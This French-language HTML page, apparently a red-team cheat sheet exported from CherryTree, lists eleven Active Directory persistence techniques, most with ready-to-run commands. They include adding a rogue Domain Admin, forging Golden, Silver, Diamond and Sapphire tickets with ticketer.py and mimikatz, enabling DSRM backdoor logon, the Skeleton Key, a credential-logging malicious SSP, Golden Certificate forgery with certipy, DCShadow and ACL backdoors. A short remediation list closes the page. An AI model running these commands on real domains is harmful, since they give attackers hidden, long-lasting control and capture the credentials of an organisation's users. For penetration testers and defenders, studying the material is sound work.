<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>14-Persistence</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>14-Persistence</h1><br/><p><ol><li><h1>Ajouter un compte permanent au groupe Domain Admins</h1></p><p></li></ol><div class="codebox"><pre>net group <span style="color:#3ad900;font-weight:400">&quot;Domain Admins&quot;</span> myuser /add /domain</pre></div><ul><li><code>• </code>• Persiste tant que personne ne repasse en revue les membres.</li></ul></p><p></p><p></p><p><ol><li>2. <h1>2. Golden Ticket (TGT forgé valable 10 ans+)</h1></li><li>Pré-requis : clé AES‐256 ou RC4 du compte <strong>krbtgt</strong>.</li></ol></p><p></p><p></p><p><div class="codebox"><pre>ticketer.py -aesKey <span style="color:#ff9d00;font-weight:700">&lt;</span>aeskey<span style="color:#ff9d00;font-weight:700">&gt;</span> -domain-sid <span style="color:#ff9d00;font-weight:700">&lt;</span>dom_SID<span style="color:#ff9d00;font-weight:700">&gt;</span> -domain <span style="color:#ff9d00;font-weight:700">&lt;</span>dom<span style="color:#ff9d00;font-weight:700">&gt;</span> <span style="color:#ff9d00;font-weight:700">&lt;</span>anyuser<span style="color:#ff9d00;font-weight:700">&gt;</span><br /><span style="color:#0088ff;font-weight:400"># ou</span><br />mimikatz <span style="color:#3ad900;font-weight:400">&quot;kerberos::golden /user:admin_user /domain:&lt;dom&gt; \<br /> /sid:&lt;dom_SID&gt; /aes256:&lt;krbtgt_key&gt; /ptt&quot;</span></pre></div><ul><li><code>◇ </code>◇ Offre un TGT pour <strong>n’importe quel utilisateur</strong>.</li></ul></p><p></p><p></p><p><ol><li>3. <h3>3. </h3><strong><h3>Silver Ticket</h3></strong><h3> (TGS forgé pour un service précis)</h3></li><li>Nécessite le hash NTLM de la <strong>machine cible</strong>.</li></ol></p><p></p><p></p><p><code>ticketer.py -nthash &lt;machine_NT_hash&gt; -domain-sid &lt;dom_SID&gt; \</code><code></code></p><p><code> -domain &lt;dom&gt; -service cifs/&lt;target_srv&gt; &lt;anyuser&gt;</code><code></code></p><p><code># ou mimikatz &quot;kerberos::golden /sid… /target:&lt;srv&gt; /service:cifs …&quot;</code><ul><li><code>◇ </code>◇ Passe sous le radar des DC (aucun TGT demandé).</li></ul></p><p></p><p></p><p><ol><li>4. <h3>4. </h3><strong><h3>Mode restauration DSRM</h3></strong></li></ol></p><p><code>New-ItemProperty &quot;HKLM:\System\CurrentControlSet\Control\Lsa&quot; `</code><code></code></p><p><code> -Name DsrmAdminLogonBehavior -Value 2 -PropertyType DWORD</code><ul><li><code>◇ </code>◇ Autorise la connexion <strong>admin DSRM</strong> en ligne → backdoor locale sur le DC.</li></ul></p><p></p><p></p><p><ol><li>5. <h3>5. </h3><strong><h3>Skeleton Key</h3></strong><h3> (mot de passe maitre)</h3></li></ol></p><p><code>mimikatz &quot;privilege::debug&quot; &quot;misc::skeleton&quot; &quot;exit&quot;</code><code></code></p><p><code># Password universel = mimikatz</code><ul><li><code>◇ </code>◇ Touche seulement NTLM (pas Kerberos) mais offre accès à tous les comptes.</li></ul></p><p></p><p></p><p><ol><li>6. <h3>6. </h3><strong><h3>Custom SSP</h3></strong><h3> (Single Sign-On provider malveillant)</h3></li></ol></p><p><code>mimikatz &quot;privilege::debug&quot; &quot;misc::memssp&quot; &quot;exit&quot;</code><code></code></p><p><code># DLL logge les creds dans C:\Windows\System32\kiwissp.log</code><ul><li><code>◇ </code>◇ Capture continue des identifiants durant les connexions interactives.</li></ul></p><p></p><p></p><p><ol><li>7. <h3>7. </h3><strong><h3>Golden Certificate</h3></strong><h3> (AD CS compromise – ESC5/ESC6)</h3></li></ol></p><p><code>certipy ca-backup -ca &lt;ca_name&gt; -username &lt;user&gt;@&lt;dom&gt; -hashes &lt;hash&gt;</code><code></code></p><p><code>certipy forge -ca-pfx &lt;ca.pfx&gt; -upn administrator@&lt;dom&gt; \</code><code></code></p><p><code>              -subject &quot;CN=user,CN=Users,DC=CORP,DC=LOCAL&quot;</code><ul><li><code>◇ </code>◇ Permet de générer indéfiniment de <em>nouveaux</em> certificats d’admin.</li></ul></p><p></p><p></p><p><ol><li>8. <h3>8. </h3><strong><h3>Diamond Ticket</h3></strong><h3> (TGT + groupe personnalisé)</h3></li></ol></p><p><code>ticketer.py -request -domain &lt;dom&gt; -user &lt;usr&gt; -password &lt;pwd&gt; \</code><code></code></p><p><code> -nthash &lt;hash&gt; -aesKey &lt;aeskey&gt; -user-id &lt;SID_RID&gt; \</code><code></code></p><p><code> -groups &quot;512,513,518,519,520&quot;</code><ul><li><code>◇ </code>◇ Combine Golden + Silver pour bypass RBAC.</li></ul></p><p></p><p></p><p><ol><li>9. <h3>9. </h3><strong><h3>Saphire Ticket</h3></strong><h3> (TGS forgé + impersonation)</h3></li></ol></p><p><code>ticketer.py -request -impersonate &lt;anyuser&gt; -domain &lt;dom&gt; \</code><code></code></p><p><code> -user &lt;usr&gt; -password &lt;pwd&gt; -nthash &lt;hash&gt; -aesKey &lt;aeskey&gt; \</code><code></code></p><p><code> -domain-sid &lt;dom_SID&gt;</code><ul><li><code>◇ </code>◇ TGS flexible pour n’importe quel service.</li></ul></p><p></p><p></p><p><ol><li>10. <h3>10. </h3><strong><h3>DC Shadow</h3></strong><h3> (réplique illicite d’objets)</h3></li><li>Utilise <code>mimikatz lsadump::dcshadow</code> pour pousser des attributs (p.ex. SIDHistory, ACL).</li></ol></p><p><ul><li>Persistance AD discrète, revert difficile sans audit des attributs.</li></ul></p><p></p><p></p><p><ol><li>11. <h3>11. </h3><strong><h3>Manipulation d’ACL</h3></strong><h3> (persistante &amp; furtive)</h3></li><li>Ex. ajouter <code>GenericAll</code> ou <code>WriteDACL</code> sur un objet critique :</li></ol></p><p><code>Set-ACL -Path &quot;AD:\CN=KRBTGT,...&quot; -ACLObject $myACL</code><code></code></p><p><code></code><ul><li>Rétablit l’accès même après rotation de mots de passe.</li></ul></p><p></p><p></p><p><strong>À retenir</strong></p><p> Ces mécanismes assurent un <strong>retour garanti</strong> après éjection et contournent les rotations de mots de passe (Golden/Silver/Diamond/Saphire tickets), les audits classiques (custom SSP, Skeleton Key), ou s’appuient sur l’infrastructure elle-même (Golden Certificate, DC Shadow). Un nettoyage complet nécessite :<ol><li><strong>Reset double</strong> du compte <em>krbtgt</em> ;</li></ol></p><p><ol><li>Révocation / rotation des certificats CA et des templates vulnérables ;</li></ol></p><p><ol><li>Audit approfondi des ACL, GPO et membres privilégiés.</li></ol></p><p></p></div>
</body>
</html>
